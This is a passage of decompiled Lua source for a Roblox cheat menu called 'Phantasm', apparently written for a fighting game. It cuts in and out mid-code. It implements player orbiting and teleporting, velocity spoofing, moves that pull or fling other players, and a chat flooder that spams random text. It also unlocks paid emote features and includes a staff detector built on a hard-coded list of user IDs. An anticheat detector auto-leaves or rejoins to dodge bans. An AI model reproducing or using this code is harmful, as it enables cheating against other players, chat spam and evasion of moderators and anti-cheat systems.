                                    if not v94["Pause Orbit"] then
                                        local v565 = v560.Position + v561.MoveDirection * v560.Velocity.Magnitude / 2.75;
                                        local v566 = CFrame.Angles(0, math.rad(v555), 0) * CFrame.new(l_Value_3, 0, 0);
                                        v557.CFrame = CFrame.lookAt(v557.Position, Vector3.new(v565.X, v557.Position.Y, v565.Z));
                                        task.wait();
                                        v557.CFrame = CFrame.new(v565.X, v560.Position.Y, v565.Z) * v566;
                                    end;
                                end;
                                l_RenderStepped_0:Wait();
                            until Options.OrbitBind:GetState() == false or v549 and not v549.Parent or not v549;
                            v437:Notify({
                                Title = bypassText("Orbit"), 
                                Description = bypassText("Toggled off ") .. "\239\191\189\239\191\189", 
                                Time = 2, 
                                SoundId = v71.Notification
                            });
                            local l_CurrentCamera_2 = l_Workspace_0.CurrentCamera;
                            local v568 = getChar(v12);
                            local v569 = v568 and getRoot(v568);
                            local v570 = v568 and getHumanoid(v568);
                            local v571 = v549 and getChar(v549);
                            local v572 = v571 and getRoot(v571);
                            local v573 = v571 and getHumanoid(v571);
                            if v568 and v569 and v570 and v549 and v571 and v572 and v573 then
                                if l_CurrentCamera_2 and l_CurrentCamera_2.CameraSubject == v573 then
                                    l_CurrentCamera_2.CameraSubject = v570;
                                end;
                            elseif v568 and v569 and v570 then
                                l_CurrentCamera_2.CameraSubject = v570;
                            end;
                            if v551 then
                                heartbeatTp(v551);
                            end;
                        end;
                        return;
                    end;
                end
            });
            v446:AddSlider("OrbitSpeed", {
                Text = bypassText("Orbit Speed"), 
                Default = 10, 
                Min = 1, 
                Max = 100, 
                Rounding = 1
            });
            v446:AddSlider("OrbitDistance", {
                Text = bypassText("Orbit Distance"), 
                Default = 3, 
                Min = 1, 
                Max = 100, 
                Rounding = 1
            });
            v446:AddDivider();
            v446:AddToggle("VelocitySpoof", {
                Text = bypassText("Velocity Spoof"), 
                Default = false, 
                Callback = function(v574) --[[ Line: 0 ]] --[[ Name:  ]]
                    -- upvalues: v94 (ref)
                    if not v574 then
                        v94["Velocity Spoof"] = false;
                        if Options.VelocitySpoofBind:GetState() == true then
                            Options.VelocitySpoofBind.Toggled = false;
                            Options.VelocitySpoofBind:DoClick();
                        end;
                    end;
                end
            }):AddKeyPicker("VelocitySpoofBind", {
                SyncToggleState = false, 
                Mode = "Toggle", 
                Default = "X", 
                Text = bypassText("Velocity Spoof"), 
                Callback = function(v575) --[[ Line: 0 ]] --[[ Name:  ]]
                    -- upvalues: v480 (ref), l_RenderStepped_0 (ref), v94 (ref), v437 (ref), v71 (ref)
                    if v480["Velocity Spoof"] then
                        return;
                    elseif v575 and not Toggles.VelocitySpoof.Value then
                        l_RenderStepped_0:Wait();
                        v480["Velocity Spoof"] = true;
                        Options.VelocitySpoofBind.Toggled = false;
                        Options.VelocitySpoofBind:DoClick();
                        v480["Velocity Spoof"] = false;
                        return;
                    else
                        if Toggles.VelocitySpoof.Value then
                            v94["Velocity Spoof"] = v575;
                            v437:Notify({
                                Title = bypassText("Velocity Spoof"), 
                                Description = bypassText("Toggled ") .. (v575 and "on \226\156\133" or "off \226\157\140"), 
                                Time = 2, 
                                SoundId = v71.Notification
                            });
                        end;
                        return;
                    end;
                end
            });
            v446:AddSlider("VelocityX", {
                Text = bypassText("X"), 
                Default = 0, 
                Min = 0, 
                Max = 16384, 
                Rounding = 1, 
                Compact = true, 
                Callback = function(v576) --[[ Line: 0 ]] --[[ Name:  ]]
                    -- upvalues: v94 (ref)
                    v94["Velocity Spoof Settings"] = Vector3.new(v576, v94["Velocity Spoof Settings"].Y, v94["Velocity Spoof Settings"].Z);
                end
            });
            v446:AddSlider("VelocityY", {
                Text = bypassText("Y"), 
                Default = 0, 
                Min = 0, 
                Max = 16384, 
                Rounding = 1, 
                Compact = true, 
                Callback = function(v577) --[[ Line: 0 ]] --[[ Name:  ]]
                    -- upvalues: v94 (ref)
                    v94["Velocity Spoof Settings"] = Vector3.new(v94["Velocity Spoof Settings"].X, v577, v94["Velocity Spoof Settings"].Z);
                end
            });
            v446:AddSlider("VelocityZ", {
                Text = bypassText("Z"), 
                Default = 0, 
                Min = 0, 
                Max = 16384, 
                Rounding = 1, 
                Compact = true, 
                Callback = function(v578) --[[ Line: 0 ]] --[[ Name:  ]]
                    -- upvalues: v94 (ref)
                    v94["Velocity Spoof Settings"] = Vector3.new(v94["Velocity Spoof Settings"].X, v94["Velocity Spoof Settings"].Y, v578);
                end
            });
            v446:AddDivider();
            v446:AddToggle("TP1", {
                Text = bypassText("Teleport 1"), 
                Default = false, 
                Callback = function(v579) --[[ Line: 0 ]] --[[ Name:  ]]
                    if not v579 and Options.TP1Bind:GetState() == true then
                        Options.TP1Bind.Toggled = false;
                        Options.TP1Bind:DoClick();
                    end;
                end
            }):AddKeyPicker("TP1Bind", {
                SyncToggleState = false, 
                Mode = "Toggle", 
                Default = "E", 
                Text = bypassText("Teleport 1"), 
                Callback = function(_) --[[ Line: 0 ]] --[[ Name:  ]]
                    -- upvalues: v12 (ref)
                    Options.TP1Bind.Toggled = false;
                    if Toggles.TP1.Value then
                        local v581 = getChar(v12);
                        local v582 = v581 and getRoot(v581);
                        local v583 = v581 and getHumanoid(v581);
                        if v581 and v582 and v583 and v583.Health > 0 then
                            heartbeatTp(v582.CFrame * CFrame.new(Options.TP1X.Value, Options.TP1Y.Value, Options.TP1Z.Value));
                        end;
                    end;
                end
            });
            v446:AddSlider("TP1X", {
                Text = bypassText("X"), 
                Default = 0, 
                Min = -25, 
                Max = 25, 
                Rounding = 1, 
                Compact = true
            });
            v446:AddSlider("TP1Y", {
                Text = bypassText("Y"), 
                Default = 0, 
                Min = -25, 
                Max = 25, 
                Rounding = 1, 
                Compact = true
            });
            v446:AddSlider("TP1Z", {
                Text = bypassText("Z"), 
                Default = 20, 
                Min = -25, 
                Max = 25, 
                Rounding = 1, 
                Compact = true
            });
            v446:AddDivider();
            v446:AddToggle("TP2", {
                Text = bypassText("Teleport 2"), 
                Default = false, 
                Callback = function(v584) --[[ Line: 0 ]] --[[ Name:  ]]
                    if not v584 and Options.TP2Bind:GetState() == true then
                        Options.TP2Bind.Toggled = false;
                        Options.TP2Bind:DoClick();
                    end;
                end
            }):AddKeyPicker("TP2Bind", {
                SyncToggleState = false, 
                Mode = "Toggle", 
                Default = "R", 
                Text = bypassText("Teleport 2"), 
                Callback = function(_) --[[ Line: 0 ]] --[[ Name:  ]]
                    -- upvalues: v12 (ref)
                    Options.TP2Bind.Toggled = false;
                    if Toggles.TP2.Value then
                        local v586 = getChar(v12);
                        local v587 = v586 and getRoot(v586);
                        local v588 = v586 and getHumanoid(v586);
                        if v586 and v587 and v588 and v588.Health > 0 then
                            heartbeatTp(v587.CFrame * CFrame.new(Options.TP2X.Value, Options.TP2Y.Value, Options.TP2Z.Value));
                        end;
                    end;
                end
            });
            v446:AddSlider("TP2X", {
                Text = bypassText("X"), 
                Default = 0, 
                Min = -25, 
                Max = 25, 
                Rounding = 1, 
                Compact = true
            });
            v446:AddSlider("TP2Y", {
                Text = bypassText("Y"), 
                Default = 0, 
                Min = -25, 
                Max = 25, 
                Rounding = 1, 
                Compact = true
            });
            v446:AddSlider("TP2Z", {
                Text = bypassText("Z"), 
                Default = -20, 
                Min = -25, 
                Max = 25, 
                Rounding = 1, 
                Compact = true
            });
            local v589 = {
                422755031, 
                198131804, 
                681405668, 
                3414432341, 
                339633571, 
                430966809, 
                2039323684, 
                117723419, 
                1015595932, 
                263944298, 
                112905203, 
                2284964418, 
                1266437961, 
                3120648134, 
                1148139861, 
                1633233654, 
                3350014406, 
                971193650, 
                661273560, 
                66105529, 
                77342385, 
                167343092, 
                2055306963, 
                141984224, 
                438917845, 
                1391134999, 
                1796550069, 
                255671730, 
                3162123826, 
                1059541187, 
                1259898795, 
                31070091, 
                1041867508, 
                994994173, 
                1446694201, 
                77525605, 
                1001242712, 
                2533866869, 
                4983064295
            };
            local function v597(v590) --[[ Line: 0 ]] --[[ Name:  ]]
                -- upvalues: v12 (ref), v437 (ref), v71 (ref), v589 (ref), l_Players_0 (ref)
                if v590 == v12 then
                    return;
                else
                    local l_DisplayName_0 = v590.DisplayName;
                    if v590:IsInGroup(12013007) and Toggles.SDCheckGroup.Value then
                        local l_v590_RoleInGroup_0 = v590:GetRoleInGroup(12013007);
                        if l_v590_RoleInGroup_0 == "Tester \239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189" then
                            v437:Notify({
                                Title = bypassText("A tester is in your game!"), 
                                Description = bypassText(l_DisplayName_0), 
                                Time = 10, 
                                SoundId = v71.Notification
                            });
                        elseif l_v590_RoleInGroup_0 == "Moderator\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\184\143" then
                            v437:Notify({
                                Title = bypassText("A moderator is in your game!"), 
                                Description = bypassText(l_DisplayName_0), 
                                Time = 10, 
                                SoundId = v71.Notification
                            });
                        elseif l_v590_RoleInGroup_0 == "Contributor \226\156\143\239\184\143" then
                            v437:Notify({
                                Title = bypassText("A contributor is in your game!"), 
                                Description = bypassText(l_DisplayName_0), 
                                Time = 10, 
                                SoundId = v71.Notification
                            });
                        elseif l_v590_RoleInGroup_0 == "Developer \239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\226\128\141\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189" then
                            v437:Notify({
                                Title = bypassText("A developer is in your game!"), 
                                Description = bypassText(l_DisplayName_0), 
                                Time = 10, 
                                SoundId = v71.Notification
                            });
                        elseif l_v590_RoleInGroup_0 == "Owner \239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189" then
                            v437:Notify({
                                Title = bypassText("The owner is in your game!"), 
                                Description = bypassText(l_DisplayName_0), 
                                Time = 10, 
                                SoundId = v71.Notification
                            });
                        end;
                    end;
                    local v593 = {};
                    for _, v595 in pairs(v589) do
                        if v590.UserId == v595 and Toggles.StaffDetector.Value then
                            return v437:Notify({
                                Title = bypassText("A special person has joined!"), 
                                Description = bypassText(l_DisplayName_0), 
                                Time = 10, 
                                SoundId = v71.Notification
                            });
                        elseif Toggles.SDCheckFriends.Value and v590:IsFriendsWith(v595) then
                            v593[#v593 + 1] = l_Players_0:GetNameFromUserIdAsync(v595);
                        end;
                    end;
                    if #v593 > 0 then
                        local v596 = #v593 == 1 and v593[1] or #v593 == 2 and table.concat(v593, " and ") or #v593 .. " special people";
                        v437:Notify(bypassText(l_DisplayName_0, "has joined and is friends with", v596), 10, v71.Notification);
                    end;
                    return;
                end;
            end;
            v460:AddToggle("StaffDetector", {
                Text = bypassText("Staff Detector"), 
                Default = false, 
                Callback = function(v598) --[[ Line: 0 ]] --[[ Name:  ]]
                    -- upvalues: l_Players_0 (ref), v597 (ref)
                    if v598 then
                        for _, v600 in pairs(l_Players_0:GetPlayers()) do
                            task.spawn(pcall, v597, v600);
                        end;
                    elseif not v598 then
                        Toggles.SDCheckGroup:SetValue(false);
                        Toggles.SDCheckFriends:SetValue(false);
                    end;
                end
            });
            v460:AddToggle("SDCheckGroup", {
                Text = bypassText("Check Group"), 
                Default = false
            });
            v460:AddToggle("SDCheckFriends", {
                Text = bypassText("Check Friends"), 
                Default = false
            });
            local v601 = 0;
            local v602 = 0;
            v460:AddLabel({
                Text = bypassText("Anticheat Flags:\n" .. "\r\nA1: Report\r\nA2: Animation\r\nA3: Remote Event"), 
                DoesWrap = true, 
                Size = 16
            });
            v460:AddToggle("AnticheatDetector", {
                Text = bypassText("Anticheat Detector"), 
                Tooltip = bypassText("Detects when the game checks for cheats."), 
                Default = false, 
                Callback = function(v603) --[[ Line: 0 ]] --[[ Name:  ]]
                    -- upvalues: l_ReplicatedStorage_0 (ref), v601 (ref), v437 (ref), v71 (ref), v12 (ref)
                    if v603 then
                        local v607 = l_ReplicatedStorage_0.Replication.OnClientEvent:Connect(function(...) --[[ Line: 0 ]] --[[ Name:  ]]
                            -- upvalues: v601 (ref), v437 (ref), v71 (ref), v12 (ref)
                            local v604 = select(1, ...);
                            if v604 then
                                local v605 = rawget(v604, "Effect") or "Unknown";
                                local l_Value_4 = Options.AvoidBanMethod.Value;
                                if v605:lower() == "hicheck" then
                                    v601 = v601 + 1;
                                    v437:Notify({
                                        Title = bypassText("Anticheat Flagged"), 
                                        Description = bypassText("A1 (Report)"), 
                                        Time = 10, 
                                        SoundId = v71.Notification
                                    });
                                    if l_Value_4 == "Auto Leave" then
                                        v12:Kick("\n[Phantasm]\nAnticheat Triggered, You were reported for exploiting.");
                                    elseif l_Value_4 == "Auto Rejoin" then
                                        rejoin({
                                            Message = "\n[Phantasm]\nAnticheat Triggered, You were reported for exploiting.", 
                                            Delay = Options.RejoinDelay.Value
                                        });
                                    end;
                                end;
                            end;
                        end);
                        repeat
                            task.wait();
                        until not Toggles.AnticheatDetector.Value;
                        v607:Disconnect();
                    end;
                end
            });
            v460:AddDropdown("AvoidBanMethod", {
                Values = {
                    "None", 
                    "Auto Leave", 
                    "Auto Rejoin"
                }, 
                Default = 1, 
                Multi = false, 
                Text = bypassText("Avoid Ban Method")
            });
            v460:AddSlider("RejoinDelay", {
                Text = bypassText("Rejoin Delay"), 
                Default = 3, 
                Min = 0, 
                Max = 10, 
                Rounding = 1
            });
            v463:AddToggle("AutoEmoteSpin", {
                Text = bypassText("Auto Emote Spin"), 
                Default = false
            });
            v463:AddDivider();
            v463:AddToggle("FreeEmotes", {
                Text = bypassText("Knockoff Free Emotes"), 
                Default = false
            });
            v463:AddToggle("FreeEmoteSearchBar", {
                Text = bypassText("Free Emote Search Bar"), 
                Default = false, 
                Callback = function(v608) --[[ Line: 0 ]] --[[ Name:  ]]
                    -- upvalues: v12 (ref)
                    if not v608 or not v12:GetAttribute("EmoteSearchBar") then
                        v12:SetAttribute("EmoteSearchBar", v608 and true or nil);
                    end;
                end
            });
            v463:AddToggle("Free8EmoteSlots", {
                Text = bypassText("Free 8 Emote Slots"), 
                Default = false, 
                Callback = function(v609) --[[ Line: 0 ]] --[[ Name:  ]]
                    -- upvalues: v12 (ref)
                    if not v609 or not v12:GetAttribute("ExtraSlots") then
                        v12:SetAttribute("ExtraSlots", v609 and true or nil);
                    end;
                end
            });
            v463:AddToggle("FreeEmotePage", {
                Text = bypassText("Free Emote Page"), 
                Default = false, 
                Callback = function(v610) --[[ Line: 0 ]] --[[ Name:  ]]
                    -- upvalues: v12 (ref)
                    if not v610 or not v12:GetAttribute("EmotePages") then
                        v12:SetAttribute("EmotePages", v610 and true or nil);
                    end;
                end
            });
            v463:AddLabel({
                Text = bypassText("Total Emotes:", Emotes and #Emotes or "Unknown"), 
                DoesWrap = true, 
                Size = 16
            });
            v463:AddToggle("DisableMessaging", {
                Text = bypassText("Disable Messaging"), 
                Tooltip = bypassText("Incase you get mad at someone and can't hold yourself back."), 
                Default = false
            });
            v463:AddToggle("AntiChatLogger", {
                Text = bypassText("Anti Chat Logger"), 
                Default = false
            });
            v463:AddToggle("ChatFlooder", {
                Text = bypassText("Chat Flooder"), 
                Default = false, 
                Callback = function(v611) --[[ Line: 0 ]] --[[ Name:  ]]
                    if v611 then
                        repeat
                            sendMsg(randomAlphabeticalString(200));
                            local v612 = tick();
                            repeat
                                task.wait();
                            until tick() >= v612 + Options.ChatFlooderDelay.Value or not Toggles.ChatFlooder.Value;
                        until not Toggles.ChatFlooder.Value;
                    end;
                end
            });
            v463:AddSlider("ChatFlooderDelay", {
                Text = bypassText("Chat Flooder Delay"), 
                Default = 3.5, 
                Min = 0.5, 
                Max = 5, 
                Rounding = 1
            });
            if l_l_HttpService_0_0 == "8503ecc70e68aa38ab0cf58354594365abbb8c0943429dd68d1243902600533e5d4149e25dd640afb87da3f52a4f6751d7f8133cd25275792e9b40d06bf43156" then
                v449:AddToggle("TrashcanLaunchh", {
                    Text = bypassText("Frozen Soul Dual Moveset"), 
                    Default = false
                });
            end;
            v449:AddDivider();
            v449:AddToggle("TrashcanLaunch", {
                Text = bypassText("Trashcan Launch"), 
                Default = false
            });
            v449:AddSlider("Trashcan_LaunchPower", {
                Text = bypassText("Launch Power"), 
                Default = 100, 
                Min = 1, 
                Max = 2500, 
                Rounding = 1
            });
            v449:AddDivider();
            v449:AddToggle("SkillBring", {
                Text = bypassText("Skill Bring"), 
                Default = false
            });
            v449:AddToggle("SkillBringTPBack", {
                Text = bypassText("TP Back on Bring"), 
                Default = false
            });
            v449:AddDropdown("SkillBringArea", {
                Text = bypassText("Skill Bring Area"), 
                Values = v73, 
                Multi = false, 
                Default = table.find(v73, "Death Counter"), 
                Searchable = false
            });
            local l_Middle_0 = v72.Middle;
            v449:AddButton({
                Text = bypassText("Goto"), 
                Callback = function() --[[ Line: 0 ]] --[[ Name:  ]]
                    -- upvalues: v72 (ref), v12 (ref), l_Middle_0 (ref)
                    local v614 = v72[Options.SkillBringArea.Value];
                    local v615 = getChar(v12);
                    local v616 = v615 and getRoot(v615);
                    if v615 and v616 and (l_Middle_0.Position - v614.Position).Magnitude >= 100 then
                        l_Middle_0 = v616.CFrame;
                    end;
                    heartbeatTp(v614);
                end
            }):AddButton({
                Text = bypassText("Back"), 
                Callback = function() --[[ Line: 0 ]] --[[ Name:  ]]
                    -- upvalues: l_Middle_0 (ref)
                    heartbeatTp(l_Middle_0);
                end
            });
            v449:AddDivider();
            v449:AddToggle("AttackAll", {
                Text = bypassText("Attack All"), 
                Default = false
            });
            v449:AddDropdown("AttackAllMoves", {
                Values = {
                    "Savage Tornado", 
                    "Brutal Beatdown", 
                    "Crushed Rock Variant"
                }, 
                Multi = true, 
                Default = {}
            });
            v449:AddDivider();
            v449:AddToggle("SkillThrow", {
                Text = bypassText("Skill Throw"), 
                Default = false
            });
            v449:AddDropdown("SkillThrowMoves", {
                Values = {
                    "Hunters Grasp", 
                    "Homerun"
                }, 
                Multi = true, 
                Default = {}
            });
            v449:AddDivider();
            v449:AddToggle("NoBP_WindstormFury", {
                Text = bypassText("No Windstorm Fury BP"), 
                Default = false
            });
            v449:AddToggle("NoBP_TatsumakiUlt", {
                Text = bypassText("No Tatsumaki Ult BP"), 
                Default = false
            });
            v449:AddToggle("NoBP_PreysPeril", {
                Text = bypassText("No Prey's Peril BP"), 
                Default = false
            });
            v449:AddToggle("FlingOnDeath", {
                Text = bypassText("Fling On Death"), 
                Default = false
            });
            v450:AddToggle("WallComboAnywhere", {
                Text = bypassText("Wall Combo Anywhere"), 
                Default = false
            });
            v450:AddDropdown("AutoWallCombo", {
                Text = bypassText("Auto Wall Combo"), 
                Values = {
                    "Disabled", 
                    "Auto Wall Combo", 
                    "Auto Wall Combo + Bring"
                }, 
                Multi = false, 
                Default = 1
            });
            v450:AddToggle("AutoWallComboTPBack", {
                Text = bypassText("Teleport Back"), 
                Default = false
            });
            v450:AddDropdown("AutoWallComboArea", {
                Text = bypassText("Area"), 
                Values = v76, 
                Multi = false, 
                Default = table.find(v76, "Death Counter"), 
                Searchable = true
            });
            local l_Middle_1 = v72.Middle;
            v450:AddButton({
                Text = bypassText("Teleport To Area"), 
                Callback = function() --[[ Line: 0 ]] --[[ Name:  ]]
                    -- upvalues: v75 (ref), v12 (ref), l_Middle_1 (ref)
                    local v618 = v75[Options.AutoWallComboArea.Value];
                    local v619 = getChar(v12);
                    local v620 = v619 and getRoot(v619);
                    if v619 and v620 and (l_Middle_1.Position - v618.Position).Magnitude >= 100 then
                        l_Middle_1 = v620.CFrame;
                    end;
                    heartbeatTp(v618);
                end
            });
            v450:AddButton({
                Text = bypassText("Teleport Back"), 
                Callback = function() --[[ Line: 0 ]] --[[ Name:  ]]
                    -- upvalues: l_Middle_1 (ref)
                    heartbeatTp(l_Middle_1);
                end
            });
            v451:AddButton({
                Text = bypassText("Toggle All On"), 
                Callback = function() --[[ Line: 0 ]] --[[ Name:  ]]
                    for v621, v622 in pairs(Toggles) do
                        if v621:find("^AntiMoves_") and v622.Type == "Toggle" then
                            v622:SetValue(true);
                        end;
                    end;
                    for v623, v624 in pairs(Options) do
                        if v623:find("^AntiMoves_") and v624.Type == "Dropdown" then
                            local v625 = {};
                            for _, v627 in pairs(v624.Values) do
                                v625[v627] = true;
                            end;
                            v624:SetValue(v625);
                        end;
                    end;
                end
            }):AddButton({
                Text = bypassText("Toggle All Off"), 
                Callback = function() --[[ Line: 0 ]] --[[ Name:  ]]
                    for v628, v629 in pairs(Toggles) do
                        if v628:find("^AntiMoves_") and v629.Type == "Toggle" then
                            v629:SetValue(false);
                        end;
                    end;
                    for v630, v631 in pairs(Options) do
                        if v630:find("^AntiMoves_") and v631.Type == "Dropdown" then
                            v631:SetValue({});
                        end;
                    end;
                end
            });
            v451:AddToggle("AntiExploits_Fling", {
                Text = bypassText("Anti Fling"), 
                Default = false
            });
            v451:AddToggle("AntiExploits_Invisibility", {
                Text = bypassText("Anti Invisibility"), 
                Default = false, 
                Visible = true, 
                Callback = function(v632) --[[ Line: 0 ]] --[[ Name:  ]]
                    -- upvalues: v93 (ref), l_RenderStepped_0 (ref), l_Players_0 (ref), v12 (ref)
                    if v632 then
                        local function v636(v633) --[[ Line: 0 ]] --[[ Name:  ]]
                            -- upvalues: v93 (ref), l_RenderStepped_0 (ref)
                            for _, v635 in pairs(v93) do
                                if v633.Animation.AnimationId:match(v635) and v633.Speed ~= 1 then
                                    task.spawn(function() --[[ Line: 0 ]] --[[ Name:  ]]
                                        -- upvalues: v633 (ref), l_RenderStepped_0 (ref)
                                        repeat
                                            v633:AdjustWeight(-999999);
                                            l_RenderStepped_0:Wait();
                                        until not v633.IsPlaying or not Toggles.AntiExploits_Invisibility.Value;
                                    end);
                                end;
                            end;
                        end;
                        do
                            local l_v636_0 = v636;
                            local function v650(v638) --[[ Line: 0 ]] --[[ Name:  ]]
                                -- upvalues: l_v636_0 (ref)
                                local v639 = getChar(v638);
                                local v640 = v639 and getRoot(v639);
                                local v641 = v639 and getHumanoid(v639);
                                if v639 and v641 then
                                    for _, v643 in pairs(v639:GetDescendants()) do
                                        do
                                            local l_v643_0 = v643;
                                            if l_v643_0:IsA("BasePart") then
                                                if l_v643_0.Transparency == 1 and l_v643_0 ~= v640 and not l_v643_0.Name:find("^Hitbox_") then
                                                    l_v643_0.Transparency = 0;
                                                end;
                                                local v645 = 0;
                                                do
                                                    local l_v645_0 = v645;
                                                    l_v643_0:GetPropertyChangedSignal("Transparency"):Connect(function() --[[ Line: 0 ]] --[[ Name:  ]]
                                                        -- upvalues: l_v643_0 (ref), l_v645_0 (ref)
                                                        if l_v643_0.Transparency == 1 then
                                                            l_v643_0.Transparency = l_v645_0;
                                                        end;
                                                        l_v645_0 = l_v643_0.Transparency;
                                                    end);
                                                end;
                                            end;
                                        end;
                                    end;
                                    for _, v648 in pairs(v641:GetPlayingAnimationTracks()) do
                                        l_v636_0(v648);
                                    end;
                                    v641.AnimationPlayed:Connect(function(v649) --[[ Line: 0 ]] --[[ Name:  ]]
                                        -- upvalues: l_v636_0 (ref)
                                        l_v636_0(v649);
                                    end);
                                end;
                            end;
                            for _, v652 in pairs(l_Players_0:GetPlayers()) do
                                if v652 ~= v12 then
                                    v650(v652);
                                end;
                            end;
                            local v653 = l_Players_0.PlayerAdded:Connect(v650);
                            repeat
                                l_RenderStepped_0:Wait();
                            until not Toggles.AntiExploits_Invisibility.Value;
                            v653:Disconnect();
                        end;
                    end;
                end
            });
            v451:AddToggle("AntiMovesMisc_BackdashCancel", {
                Text = bypassText("Backdash Cancel"), 
                Default = false
            });
            v451:AddToggle("AntiMoves_Trashcan", {
                Text = bypassText("Anti Trash Can"), 
                Default = false
            });
            v451:AddDropdown("AntiMoves_Saitama", {
                Text = bypassText("Anti Saitama"), 
                Values = {
                    "Anti Normal Punch", 
                    "Anti Consecutive Punches", 
                    "Anti Shove", 
                    "Anti Uppercut", 
                    "Anti Death Counter", 
                    "Anti Death Counter Quotes", 
                    "Anti Table Flip", 
                    "Anti Serious Punch", 
                    "Anti Omni-Directional Punch"
                }, 
                Multi = true, 
                Default = {}, 
                Searchable = true
            });
            v451:AddDropdown("AntiMoves_Garou", {
                Text = bypassText("Anti Garou"), 
                Values = {
                    "Anti Flowing Water", 
                    "Anti Lethal Whirlwind Stream", 
                    "Anti Hunters Grasp", 
                    "Anti Preys Peril", 
                    "Anti Garou Ult", 
                    "Anti Water Stream Rock Smashing Fist", 
                    "Anti Final Hunt", 
                    "Anti Rock Splitting Fist", 
                    "Anti Crushed Rock"
                }, 
                Multi = true, 
                Default = {}, 
                Searchable = true
            });
            v451:AddDropdown("AntiMoves_Genos", {
                Text = bypassText("Anti Genos"), 
                Values = {
                    "Anti Thunder Kick", 
                    "Anti Flamewave Cannon", 
                    "Anti Incinerate"
                }, 
                Multi = true, 
                Default = {}, 
                Searchable = true
            });
            v451:AddDropdown("AntiMoves_Tatsumaki", {
                Text = bypassText("Anti Tatsumaki"), 
                Values = {
                    "Anti Crushing Pull", 
                    "Anti Windstorm Fury", 
                    "Anti Stone Grave", 
                    "Anti Expulsive Push", 
                    "Anti Tatsumaki Ult", 
                    "Anti Terrible Tornado"
                }, 
                Multi = true, 
                Default = {}, 
                Searchable = true
            });
            v451:AddDropdown("AntiMoves_AtomicSamurai", {
                Text = bypassText("Anti Atomic Samurai"), 
                Values = {
                    "Anti Atomic Samurai Ult", 
                    "Anti Sunset", 
                    "Anti Solar Cleave", 
                    "Anti Atomic Slash", 
                    "Anti Atomic Slash Finisher"
                }, 
                Multi = true, 
                Default = {}, 
                Searchable = true
            });
            v451:AddDropdown("AntiMoves_Suiryu", {
                Text = bypassText("Anti Suiryu"), 
                Values = {
                    "Anti Whirlwind Drop", 
                    "Anti Suiryu Ult", 
                    "Anti Grand Fissure", 
                    "Anti Twin Fangs", 
                    "Anti Earth Splitting Strike", 
                    "Anti Last Breath"
                }, 
                Multi = true, 
                Default = {}, 
                Searchable = true
            });
            v451:AddDropdown("AntiMoves_MetalBat", {
                Text = formatRichText(255, 0, 0, "Anti Metal Bat"), 
                Values = {
                    "Anti Savage Tornado", 
                    "Anti Death Blow"
                }, 
                Multi = true, 
                Default = {}, 
                Searchable = true
            });
            v451:AddDropdown("AntiMoves_Sonic", {
                Text = formatRichText(255, 0, 0, bypassText("Anti Speed-o'-Sonic")), 
                Values = {
                    "Anti Flash Strike", 
                    "Anti Whirlwind Kick", 
                    "Anti Twinblade Rush", 
                    "Anti Carnage", 
                    "Anti Fourfold Flashstrike"
                }, 
                Multi = true, 
                Default = {}, 
                Searchable = true
            });
            v451:AddDropdown("AntiMoves_KJ", {
                Text = formatRichText(255, 0, 0, bypassText("Anti KJ")), 
                Values = {
                    "Anti Stoic Bomb", 
                    "Anti 20-20-20 Dropkick", 
                    "Anti Five Seasons"
                }, 
                Multi = true, 
                Default = {}, 
                Searchable = true
            });
            v451:AddDropdown("AntiMoves_FrozenSoul", {
                Text = formatRichText(0, 255, 255, bypassText("Anti Frozen Soul")), 
                Values = {
                    "Anti Permafrost", 
                    "Anti Frost Forge", 
                    "Anti Freezing Path", 
                    "Anti Judgement Chain"
                }, 
                Multi = true, 
                Default = {}, 
                Searchable = true
            });
            v452:AddButton({
                Text = bypassText("Toggle All On"), 
                Callback = function() --[[ Line: 0 ]] --[[ Name:  ]]
                    for v654, v655 in pairs(Toggles) do
                        if v654:find("^InvisibleMoves_") and v655.Type == "Toggle" then
                            v655:SetValue(true);
                        end;
                    end;
                    for v656, v657 in pairs(Options) do
                        if v656:find("^InvisibleMoves_") and v657.Type == "Dropdown" then
                            local v658 = {};
                            for _, v660 in pairs(v657.Values) do
                                v658[v660] = true;
                            end;
                            v657:SetValue(v658);
                        end;
                    end;
                end
            }):AddButton({
                Text = bypassText("Toggle All Off"), 
                Callback = function() --[[ Line: 0 ]] --[[ Name:  ]]
                    for v661, v662 in pairs(Toggles) do
                        if v661:find("^InvisibleMoves_") and v662.Type == "Toggle" then
                            v662:SetValue(false);
                        end;
                    end;
                    for v663, v664 in pairs(Options) do
                        if v663:find("^InvisibleMoves_") and v664.Type == "Dropdown" then
                            v664:SetValue({});
                        end;
                    end;
                end
            });
            v452:AddToggle("InvisibleMoves_Block", {
                Text = bypassText("Invisible Block"), 
                Default = false
            });
            v452:AddToggle("InvisibleMoves_BlockColor", {
                Text = bypassText("Block Color"), 
                Default = false
            }):AddColorPicker("InvisibleMoves_BlockColor1", {
                Default = Color3.fromRGB(0, 255, 255), 
                Title = "Start"
            }):AddColorPicker("InvisibleMoves_BlockColor2", {
                Default = Color3.fromRGB(0, 0, 255), 
                Title = "Middle", 
                Transparency = 0
            }):AddColorPicker("InvisibleMoves_BlockColor3", {
                Default = Color3.fromRGB(255, 0, 0), 
                Title = "End", 
                Transparency = 0
            });
            v452:AddToggle("InvisibleMoves_Counter", {
                Text = bypassText("Invisible Counter"), 
                Default = false
            });
            v452:AddToggle("InvisibleMoves_CounterHit", {
                Text = bypassText("Invisible Counter Hit"), 
                Default = false
            });
            v452:AddDropdown("InvisibleMoves_Saitama", {
                Text = bypassText("Invisible Saitama"), 
                Values = {
                    "Invisible Ult", 
                    "Invisible Table Flip", 
                    "Invisible Serious Punch", 
                    "Invisible Omni-Directional Punch"
                }, 
                Multi = true, 
                Default = {}, 
                Searchable = true
            });
            v452:AddDropdown("InvisibleMoves_Garou", {
                Text = bypassText("Invisible Garou"), 
                Values = {
                    "Invisible Ult"
                }, 
                Multi = true, 
                Default = {}, 
                Searchable = true
            });
            v452:AddDropdown("InvisibleMoves_Sonic", {
                Text = bypassText("Invisible Speed-o'-Sonic"), 
                Values = {
                    "Invisible Ult"
                }, 
                Multi = true, 
                Default = {}, 
                Searchable = true
            });
            v452:AddDropdown("InvisibleMoves_Genos", {
                Text = bypassText("Invisible Genos"), 
                Values = {
                    "Invisible Ult", 
                    "Invisible Incinerate"
                }, 
                Multi = true, 
